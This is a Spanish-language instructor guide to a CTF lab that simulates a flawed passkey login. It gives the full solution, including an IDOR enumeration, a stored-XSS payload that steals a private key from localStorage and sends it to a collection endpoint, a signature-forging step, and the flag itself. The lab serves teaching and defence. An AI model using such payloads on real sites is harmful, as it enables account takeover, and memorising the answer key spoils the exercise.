# Guía del instructor — CTF "Passwordless de Cartón" (HackerBank)

Documento para el equipo organizador del **Hacking Day de Córdoba**: solución
completa, explicación de cada vulnerabilidad, teoría de FIDO2, rúbrica y montaje.

> 100% educativo y ético. Todos los datos son ficticios.

---

## 1. Objetivo pedagógico

Enseñar, por contraste, cómo protege FIDO2/WebAuthn real. El estudiante roba la
clave privada del CEO con un **Stored XSS** y entra a su cuenta. El aprendizaje
central: **guardar la clave privada donde JavaScript la alcanza (`localStorage`)
la hace robable por un XSS.** En FIDO2 real la clave vive en el TPM/Secure
Enclave y JS nunca la toca — el mismo XSS no roba nada.

## 2. Diseño y vulnerabilidades

Login estilo **Windows Hello / WebAuthn** (ceremonia `options → assert`). Como
FIDO2 real, el servidor SOLO guarda claves públicas (tabla `credentials`); la
clave privada de cada passkey vive en `localStorage` del cliente. Endpoints:

| Endpoint | Qué hace |
|---|---|
| `POST /auth/register` | Registra una passkey (solo la pública). Cerrado para el CEO. |
| `POST /auth/hello/options` | `{username}` → `{user_id, challenge, rpId, userVerification}`. |
| `GET /auth/keys/<user_id>` | Credencial (credential_id + pública) de cualquiera. **IDOR**. |
| `POST /auth/hello/assert` | `{username, id, type, response:{clientDataJSON, authenticatorData, signature}}` → sesión. Honesto (valida binding + firma). |
| `POST /messages` / `GET /inbox` | Deja / muestra "mensajes al administrador". `/inbox` (y la vista previa de `/mensajes`) no sanitizan → **Stored XSS**. |
| `POST /social/notify` | Encola la revisión del agente CEO (1/min). Lo dispara el portal de soporte (`:5001`). |
| `GET /collect` / `GET /collected` | Buzón donde el payload exfiltra / donde se lee. |
| `POST /internal/provision-ceo` | **Interno** (token `X-Agent-Token`): el agente aprovisiona la pública del CEO. One-shot. |
| `GET /internal/agent/pending` | **Interno** (token): el agente consulta si hay pedido de visita. |

Buscar `VULN` en `app.py`:
- **VULN-1 (IDOR):** `/auth/keys/<id>` sin autorización → filtra el credential_id del CEO.
- **VULN-2 (Stored XSS):** `/inbox` y la vista previa de `/mensajes` renderizan con `| safe`.
- **VULN-3 (challenge no vinculado):** `/auth/hello/assert` lee el challenge del
  `clientDataJSON` que manda el cliente y NO lo valida contra el que emitió
  `options` (ni chequea `origin`) → replay / challenge elegido.

**Teatro de Windows Hello:** `script.js` invoca el PIN real del SO con
`navigator.credentials.create()` y **descarta** el resultado; la auth real corre
con la clave de software de `localStorage`. El factor fuerte no protege nada.

El agente CEO (`agente/agent.py`, Playwright headless, **contenedor aparte**)
tiene la clave privada del CEO en su `localStorage` pero **no una sesión
bancaria**: por eso el XSS solo puede robar la clave, no leer la flag directo.
`/auth/hello/assert` mantiene honesto lo importante (binding + firma): el pecado
es que la privada era robable (y VULN-3). El agente **genera** la passkey del CEO
y aprovisiona solo la pública por `/internal/provision-ceo` (con token y
one-shot): el banco nunca ve la privada, y un token filtrado tras el arranque no
sirve para registrarle una passkey nueva al CEO.

## 3. Solución paso a paso

Usuarios: `t3ny` (práctica), `ceo` (id `7013`, objetivo), señuelos.

### Capa 1 — Reconocer el flujo (Burp)
Login como `t3ny` en `/login` con **Windows Hello** (si estás en Windows, aparece
el PIN real — es teatro, su credencial se descarta). En Burp: `POST
/auth/register` (registra la passkey, solo la pública), `POST /auth/hello/options`
(→ `user_id`, `challenge`), `GET /auth/keys/<user_id>` (→ tu credential_id), `POST
/auth/hello/assert` (manda `clientDataJSON` + firma). La clave privada nunca viaja
(vive en `localStorage`: `localStorage.getItem("hb_privkey_t3ny")`).

### Capa 2 — IDOR: el credential_id del CEO
En el Repeater, variar `GET /auth/keys/<id>` (`7013`, `7025`, `7031`, `7058`).
Identificar `7013 = ceo` y guardar su `credential_id`. Con la clave pública no se
puede firmar: falta la privada.

### Capa 3 — Stored XSS: robar la clave privada del CEO
1. Logueado como `t3ny`, ir a **Mensajes al administrador** (`/mensajes`) y dejar
   un mensaje con el payload:

```html
Hola, necesito ayuda con mi cuenta.
<script>
window.addEventListener("load", function () {
  var user = document.getElementById("nombre_usuario").innerText;
  if (user !== "t3ny") {                                    // es el CEO
    var priv = localStorage.getItem("hb_privkey_" + user); // su clave privada
    new Image().src = "/collect?data=" + encodeURIComponent(priv);
  }
});
</script>
```

   Antes del payload real conviene mandar `<b>hola</b>`: la tarjeta **"Vista
   previa — así lo verá el administrador"** lo muestra en negrita → confirma el XSS.
2. Desde el **portal de soporte** (`http://localhost:5001`, botón "Avisar al
   administrador") → el agente CEO visita `/inbox` y ejecuta el payload. (También
   entra solo cada ~45 s.)
3. Leer la clave privada del CEO en **`/collected`**.

### Capa 4 — Firmar y entrar (consola F12)
Con el credential_id (Capa 2) y la clave (Capa 3). En la consola de una página
que cargue `script.js` (p.ej. `/collected` o `/login`):

```js
helloForge("ceo", "<credential_id del IDOR>", "<clave privada del buzón>")
```

`helloForge` pide options del CEO, arma el `clientDataJSON`, lo firma
(ECDSA-SHA256, raw r‖s) y hace el `assert` → entra como CEO → **código ganador** +
pantalla comparativa.

### Script de resolución
[`solve.py`](solve.py) hace todo con `requests` (el agente ejecuta el XSS): login
`t3ny` → deja el payload → pide la revisión (`/social/notify`) → lee la clave en
`/collected` → credential_id por IDOR → firma el `clientDataJSON` y hace el
`assert`. Imprime la flag.

## 4. El código ganador (flag)

```
f27ad11c21afef4f4c54a3930698f616
```

MD5 ficticio, determinístico (`CEO_WINNING_CODE` en `seed.py`). Cambiarlo ahí si
se quiere una flag distinta por evento.

## 5. Teoría: FIDO2/WebAuthn real

- **Registro:** el dispositivo genera el par; al servidor viaja solo la **clave
  pública**. La privada la crea y guarda el autenticador (TPM/Secure Enclave).
- **Autenticación:** el servidor manda un `challenge`; el autenticador lo firma
  con la clave privada (desbloqueada por biometría/PIN) y devuelve la **firma**.
  Nunca la clave privada.
- **TPM / Secure Enclave:** chip que genera y usa la clave **adentro**; el
  software solo recibe la firma. La clave es **inextraíble**: ni el dueño del
  dispositivo, ni un XSS, ni un compromiso del SO la pueden leer.

### Tabla comparativa (la que ve el estudiante al ganar)

| Lo que rompiste (FIDO2 de cartón) | Cómo lo previene FIDO2 real |
|---|---|
| El PIN de Windows Hello no te frenó | El PIN acá era teatro; en Windows Hello real desbloquea la clave del TPM, que firma adentro |
| Robaste la clave privada del CEO con un XSS | La clave vive en el TPM: JavaScript nunca puede leerla |
| La clave estaba en localStorage, al alcance de JS | En FIDO2 la clave nunca sale del hardware ni toca el navegador |
| Un mensaje malicioso ejecutó código en el CEO | Aunque haya XSS, del lado del cliente no hay clave privada que robar |
| Filtraste el credential_id con un IDOR | El credential_id no es secreto, pero sin la privada (inrobable) no sirve |
| Firmaste el challenge con la clave robada | Firmar exige la clave en hardware + verificación del usuario (biometría) |

## 6. Rúbrica sugerida

| Criterio | Qué se espera | Puntaje |
|---|---|---|
| Reconocimiento (Capa 1) | Capturas de Burp del flujo; notar que la privada vive en localStorage. | 15% |
| IDOR (Capa 2) | Evidencia de la enumeración de `/auth/keys` y del credential_id del CEO. | 20% |
| Stored XSS (Capa 3) | El payload, cómo detecta a la víctima, la ingeniería social y la exfiltración. | 30% |
| Firma y suplantación (Capa 4) | Firmar el challenge (raw r‖s, P-256) con la clave robada y obtener la flag. | 20% |
| Mitigación | Output encoding / sanitizar + CSP, y por qué la clave debe estar en hardware. | 15% |

Flag correcta (`f27ad11c21afef4f4c54a3930698f616`) como condición necesaria.

## 7. Montaje para el Hacking Day

### Tiempo estimado
- Capa 1: 15-25 min · Capa 2: 15-30 min · Capa 3 (XSS + bot): 25-45 min ·
  Capa 4: 15-25 min. **Total: ~70-125 min.**

### Reset entre participantes
`docker compose restart` (desde la raíz). Reinicia **los tres servicios juntos**:
el banco recrea la base (el CEO vuelve a arrancar sin credencial) y el agente
regenera su passkey y la reaprovisiona — así la privada del agente coincide con
la pública del banco. Nota: las passkeys del navegador del alumno quedan en
`localStorage`; para empezar de cero en el mismo navegador, limpiarlo.

> Importante: reiniciar **solo** el contenedor del agente (sin el banco) deja al
> banco con la credencial vieja del CEO y al agente con una privada nueva que no
> coincide (one-shot). Si pasa, reseteá todo con `docker compose restart`.

### Problemas comunes

| Problema | Causa | Solución |
|---|---|---|
| La clave no llega al buzón | El agente no corrió / no aprovisionó, o el payload esperaba mal el `load` | Ver `docker compose logs agente` (debe decir "PUBLICA aprovisionada"); usar el payload de la guía. |
| `403` al loguearse como `ceo` en la web | Registro de passkeys cerrado para el CEO (a propósito) | No es un bug: hay que robar su clave, no registrar una nueva. |
| `assert` del CEO da 401 (binding/firma) | credential_id que no es del CEO, o la privada no coincide con la pública aprovisionada | Usar el credential_id del IDOR (`7013`) y la clave de `/collected`; si el agente se reinició solo, `docker compose restart`. |
| "Firma inválida" en Python | Se firmó algo distinto del `clientDataJSON`, o DER en vez de raw r‖s | Firmar los bytes del `clientDataJSON` y convertir DER → r‖s (64 bytes), como en `solve.py`. |
| El build tarda / pesa | El agente baja Chromium (imagen de Playwright) | Es esperado la primera vez; después queda cacheado. |

### Recordatorio ético
Estas técnicas (IDOR, análisis de JS, XSS, forja de firmas) se practican acá
sobre un blanco ficticio y con permiso. Aplicarlas contra sistemas reales sin
autorización es ilegal. El valor está en entender la defensa.
